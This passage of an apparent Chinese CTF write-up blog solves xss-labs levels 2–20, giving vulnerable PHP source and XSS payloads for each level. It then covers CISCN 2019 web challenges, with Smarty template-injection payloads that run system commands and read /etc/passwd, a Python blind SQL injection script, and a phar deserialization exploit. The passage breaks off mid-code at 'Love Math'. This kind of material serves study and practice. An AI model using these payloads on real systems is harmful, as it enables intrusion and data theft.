可以看到代码会接受一个name传参，且对name内容没有任何过滤，我们直接插入js代码即可 level-2 &lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=\"'.$str.'\"&gt; &lt;input type=submit name=submit value=\"搜索\"/&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 代码对传入keyword参数作了htmlspecialchars的过滤，但是在input标签处没有设计过滤，我们只需要正常闭合插入js代码即可 \"&gt;&lt;script&gt;alert('hacker')&lt;/script&gt; level-3 &lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".\"&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword value='\".htmlspecialchars($str).\"'&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; &lt;/center&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 这一关对input与h2标签处都做了特殊字符转义，转义字符如下： 注意这里的单引号似乎是不被过滤的，我们使用即可，那之后的思路就是找一个不需要&lt;&gt;事件标签 1. 'onclick=alert('hacker')// 2. 'onfocus=javascript:alert('xss') &gt; // level-4 &lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str2=str_replace(\"&gt;\",\"\",$str); $str3=str_replace(\"&lt;\",\"\",$str2); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword value=\"'.$str3.'\"&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str3).\"&lt;/h3&gt;\"; ?&gt; 这里虽然对传入的参数过滤了&lt;&gt;，但我们只需借用上一关的payload即可。 level-5 &lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword value=\"'.$str3.'\"&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str3).\"&lt;/h3&gt;\"; ?&gt; 这里看到在input标签处，只是针对关键词进行了过滤，我们只需要使用不包含上述关键词的payload即可 \"&gt;&lt;a href=javascript:alert('hacker')&gt;hacker&lt;/a&gt;// or \"&gt;&lt;a href=javascript:alert('hacker') // level-6 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword value=\"'.$str6.'\"&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str6).\"&lt;/h3&gt;\"; ?&gt; 与上一关对比可以发现，增加了过滤href，data关键词等。但却忘记大小绕过了。 \" Onclick=alert('hacker') // or \"&gt;&lt;a Href=javascript:alert('hacker') // level-7 &lt;?php ini_set(\"display_errors\", 0); $str =strtolower( $_GET[\"keyword\"]); $str2=str_replace(\"script\",\"\",$str); $str3=str_replace(\"on\",\"\",$str2); $str4=str_replace(\"src\",\"\",$str3); $str5=str_replace(\"data\",\"\",$str4); $str6=str_replace(\"href\",\"\",$str5); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level7.php method=GET&gt; &lt;input name=keyword value=\"'.$str6.'\"&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str6).\"&lt;/h3&gt;\"; ?&gt; 与上一关比较，虽然限制了大小写的绕过，但对于关键词的过滤采用的“替换为空”这意味着我们双写绕过即可 \" oonnclick=alert('hacker') // or \"&gt;&lt;a hrhrefef=javascscriptript:alert('hacker') // level-8 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','&amp;quot',$str6); echo '&lt;center&gt; &lt;form action=level8.php method=GET&gt; &lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt; &lt;input type=submit name=submit value=添加友情链接 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str7).\"&lt;/h3&gt;\"; ?&gt; 虽然这里过滤的很全，但我们关注.$str7.即可发现，这里已经为我们写好href了，那我们只需要想办法构造js代码即可。由于双引号被过滤，这意味着我们写入的肯定会被当做字符串，但我们正好就可以利用这个特性： 在 HTML 中，对于 href 属性，浏览器会对其中的内容进行自动解码，这意味着 HTML 实体编码会在解析过程中被还原为原始字符。这就是为什么在你提供的例子中，即使插入了 HTML 实体编码，最终仍然被解释为 JavaScript 代码的原因。 那我们直接构造payload即可 javascript:alert('hacker') HTML实体编码后 &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29; 之后输入到post输入框中即可 level-9 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','&amp;quot',$str6); echo '&lt;center&gt; &lt;form action=level9.php method=GET&gt; &lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt; &lt;input type=submit name=submit value=添加友情链接 /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;?php if(false===strpos($str7,'http://')) { echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; } else { echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; } ?&gt; &lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str7).\"&lt;/h3&gt;\"; ?&gt; javascript:alert('hacker')//http:// HTML实体编码后 &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29;//http:// level-10 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str11 = $_GET[\"t_sort\"]; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 熟悉的过滤，重点关注t_sort参数即可，这里在经过两个简单校验之后就直接插入到了input事件标签中，绕过原理很容易知道，但是这里的type确实hidden。 我们可以直接F12手动除掉type，当然也可以直接payload手动构造 t_sort=\" type=\"\" onclick=alert('hacker')// level-11 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_SERVER['HTTP_REFERER']; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 这里的keyword与t_sort都进行了有效过滤，但关注http_referer会发现没有任何过滤，直接bp修改即可 修改referer头即可 level-12 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_SERVER['HTTP_USER_AGENT']; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 与上一关类似，只不过注入点在ua头，不再赘述 level-13 &lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600); ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_COOKIE[\"user\"]; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 依旧老套路，注入点在cookie处 level-14 这题环境有问题，就直接看网上的思路了：exif xss Exif XSS 漏洞是一种安全漏洞，存在于图片的 Exif（Exchangeable Image File Format）数据中。 Exif 数据是嵌入在数字图像文件中的元数据，包含有关图像的信息，如拍摄日期、相机型号、GPS 坐标等。浏览器和其他应用程序通常会解析和显示这些数据。 当存在 Exif XSS 漏洞时，攻击者可以在图像的 Exif 数据中插入恶意的 JavaScript 代码。当用户加载带有恶意 Exif 数据的图像时，浏览器或其他应用程序可能会错误地解析恶意代码，并在受害者的浏览器上执行它。 脚本如下： import PIL.ExifTags as ExifTags from PIL import Image # 打开图像文件 image = Image.open('初始.jpg') # 获取图像的 Exif 数据 exif_data = image._getexif() # 将 Exif 数据转为可修改的字典格式 exif_dict = dict(exif_data) # 修改 Exif 数据 exif_dict[ExifTags.TAGS['Make']] = 'xss语句' exif_dict[ExifTags.TAGS['Model']] = 'xss语句' # 将修改后的 Exif 数据重新写回图像 exif_bytes = ExifTags.exif_dict_to_bytes(exif_dict) image.save('改后.jpg', exif=exif_bytes) 之后思路就是先修改iframe标签，接着上传图片加载即可，具体可参考： [网络安全]xss-labs level-14 解题详析 level-15 &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"&gt;&lt;/script&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"src\"]; echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;'; ?&gt; 可以看到这里有一个ng-include属性，我们简单了解一下 这题考察 Angular JS 的 ng-include 用法，具体可以参考这篇资料：AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。 level14.php?src=\"level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;\" 特别值得注意的几点如下： 1.ng-include,如果单纯指定地址，必须要加引号 2.ng-include,加载外部html，script标签中的内容不执行 3.ng-include,加载外部html中含有style标签样式可以识别 level-16 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"&amp;nbsp;\",$str); $str3=str_replace(\" \",\"&amp;nbsp;\",$str2); $str4=str_replace(\"/\",\"&amp;nbsp;\",$str3); $str5=str_replace(\"\t\",\"&amp;nbsp;\",$str4); echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str5).\"&lt;/h3&gt;\"; ?&gt; 这里过滤掉了 script 标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。 可以使用如下符号替代空格 符号 URL 编码 回车 (CR) %0d 换行 (LF) %0a &lt;img%0Asrc=”111”%0Aonerror=alert('xss')&gt; &lt;img%0Asrc=\"1\"%0Aonmouseover=\"alert(1)\"&gt; level-17 &lt;?php ini_set(\"display_errors\", 0); echo \"&lt;embed src=index.png?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\"; ?&gt; 总的来说&lt;embed&gt;标签就是引入一个swf文件到浏览器端，并且它的src属性值没有添加引号，所以不用闭合，但这里需要用支持flash插件的浏览器才可以回显swf区域，大家可以下载，或者去后台修改引入的文件如：index.png，如下图 onmouseover=alert(1) level-18 &lt;?php ini_set(\"display_errors\", 0); echo \"&lt;embed src=index.png?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\"; ?&gt; 没什么变化，用上一关的payload即可 level-19 &lt;?php ini_set(\"display_errors\", 0); echo '&lt;embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;'; ?&gt; 跟前几关差不多，但src加了双引号来闭合，但很明显有HTML实体化函数，我们无法闭合双引号，参考Level 19 Flash XSS与Flash XSS 漏洞详解 Flash XSS（Cross-Site Scripting）是指针对使用Adobe Flash技术开发的应用程序的跨站脚本攻击。 Flash是一种用于创建富媒体和互动内容的广泛使用的技术，将恶意Flash文件嵌入到受信任的网页中，当用户访问包含恶意Flash文件的页面时，Flash文件会在用户的浏览器中执行。 这关用到的是Flash Xss注入,其实就是往Flash里面插入一段js代码，然后手动执行嘛，构造payload ?arg01=version&amp;arg02=&lt;a href=\"javascript:alert()\"&gt;here&lt;/a&gt; level-20 &lt;?php ini_set(\"display_errors\", 0); echo '&lt;embed src=\"xsf04.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;'; ?&gt; 同上一关一样有双引号，还是要flash插入js代码 ?arg01=id&amp;arg02=xss\\\"))}catch(e){alert(1)}// 0x04 参考文章 关于floor()报错注入，你真的懂了吗？ 基础汇总-sqlilab-Less-1-20 XSS 从零开始 文件上传绕过姿势整理 文件上传绕过思路总结","tags":["基本知识"],"categories":["web知识总结"]},{"title":"CISCN国赛","path":"/2024/01/24/ctf-shua-ti-zhi-lu/","content":"[CISCN 2019华东南]Web11 首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试 确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可 这里看了wp发现还有很多姿势，做个记录 {$smarty.version} //smarty的版本号 #可以使用{php}{/php}标签来执行被包裹其中的php指令 {php}phpinfo();{/php} #注：Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。 #{literal}可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。 {literal}alert('xss');{/literal} //xss攻击 ---适用于PHP5 #它相比较于{php}{/php}不同的是添加了一些特性。每个{if}必须有配对的{/if}，也可以用{else}和{else if},所有的php条件表达式和函数都可以在if内使用，比如||,or,and,&amp;等 {if phpinfo()}{/if} {if readfile ('/flag')}{/if} {if system('ls /')}{/if} {if show_source('/flag')}{/if} 静态方法利用 通过self获取Smarty类再调用其静态方法实现文件读写 ——旧版本 Smarty类有getStreamVariable方法可以读取一个文件并返回其内容 {self::getStreamVariable(“file:///etc/passwd”)} 利用 Smarty_Internal_Write_File 类的writeFile方法来写shell [CISCN 2019华北Day2]Web1 明确告诉我们是SQL注入，接下来先fuzz一下过滤字符 可以看到490的都是被过滤的，很多，关键的有select，–+，//*，/**/，information，length，and等，有意思的是这题似乎还有组合过滤的情况 并且页面只会回显，false与true对应的页面，也就是说只能sql盲注。 根据题目提示的flag位于flag表、flag列下，那估计就是二分法爆破flag字符了，接下来肯定就是想如何构造合适的payload来运行py脚本。 这里也是陷入误区，看了wp才明白忘记判断闭合方式了，这里我们可以先尝试数学运算 可以看到异或运算的结果不同，说明为数字型注入，那我们借着异或方式来构造payload import time import requests url = 'http://node4.anna.nssctf.cn:28470/index.php' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = f\"0^(ascii(substr((select(flag)from(flag)),{i},1))&gt;{mid})\" data= {\"id\":payload} #start_time = time.time() response = requests.post(url = url, data = data).text #end_time = time.time() #use_time = end_time - start_time if \"Hello\" in response: left = mid + 1 else: right = mid mid = (left + right) // 2 #print(mid) flag += chr(mid) print(\"flag:\", flag) 由于页面有数据回显，因此这里没必要用if来判断 [CISCN 2019华北Day1]Web1 进入首页发现是一个登录页面，扫网站无果后，尝试注册用户，接着看到有一个上传文件的功能，不过限制了上传马，那我们正常上传指定文件类型，发现出现下载和删除两个功能。那很容易想到这两个功能肯定存在漏洞，根据漏洞利用来看，我们先找下载功能的漏洞。点击抓包如图所示 可以看到能实现任意文件的读取 index.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;title&gt;网盘管理&lt;/title&gt; &lt;head&gt; &lt;link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;link href=\"static/css/panel.css\" rel=\"stylesheet\"&gt; &lt;script src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/bootstrap.bundle.min.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/toast.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/panel.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav aria-label=\"breadcrumb\"&gt; &lt;ol class=\"breadcrumb\"&gt; &lt;li class=\"breadcrumb-item active\"&gt;管理面板&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&lt;label for=\"fileInput\" class=\"fileLabel\"&gt;上传文件&lt;/label&gt;&lt;/li&gt; &lt;li class=\"active ml-auto\"&gt;&lt;a href=\"#\"&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;/nav&gt; &lt;input type=\"file\" id=\"fileInput\" class=\"hidden\"&gt; &lt;div class=\"top\" id=\"toast-container\"&gt;&lt;/div&gt; &lt;?php include \"class.php\"; $a = new FileList($_SESSION['sandbox']); $a-&gt;Name(); $a-&gt;Size(); ?&gt; class.php &lt;?php error_reporting(0); $dbaddr = \"127.0.0.1\"; $dbuser = \"root\"; $dbpass = \"root\"; $dbname = \"dropbox\"; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;下载&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; } } class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); } } ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, \"flag\") === false) { Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file-&gt;close(); } else { echo \"File not exist\"; } ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response); } else { Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response); } ?&gt; 我们可以发现存在敏感函数：file_get_contents($this-&gt;filename);，如果我们可以让filename为flag文件，那就得到flag了。 接下来就思考如何控制filename变量，我们先定位其所在函数 可以看到其位于File类的close函数，接下来看谁调用过该函数 我们可以在User类中的析构函数发现db调用了close函数，但如果我们直接利用这个链子是不行的，因为没有回显。那我们只好接着找寻其他回显数据的地方了。 我们可以看到FileList类中的析构函数会回显对应的$func和$filename内容，那这里肯定就是最终获取flag的地方了， 接下来我们可以再看一下call魔术方法：当访问一个类中不可访问的方法时调用 这里会将函数名引入funcs变量中，之后foreach循环，对每一个file变量对应的文件执行func也就是close方法，之后将得到的结果存入results数组中。 那链子基本明显了，就是User.destruct-》FileList.call-》File.destruct。 接下来就是寻找那里可以触发了 可以看到虽然download.php文件可以调用close，但是过滤了flag关键字。 而delete.php就没有任何限制，因此我们肯定要从这里入手，接下来就是构造phar文件内容了（配合file_get_contents实现反序列化）点击删除之后调用detele函数，接着又调用unlik函数实现phar反序列化 &lt;?php class User { public $db; public function __construct() { $this-&gt;db = new FileList(); } } class File { public $filename; } class FileList { private $files; public function __construct() { $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); } } $phar = new Phar(\"exp.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //设置stub $a = new User(); $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 接着将生成的1.phar文件后缀改为jpg上传，之后点击删除抓包，如下图所示得到flag [CISCN 2019初赛]Love Math &lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ 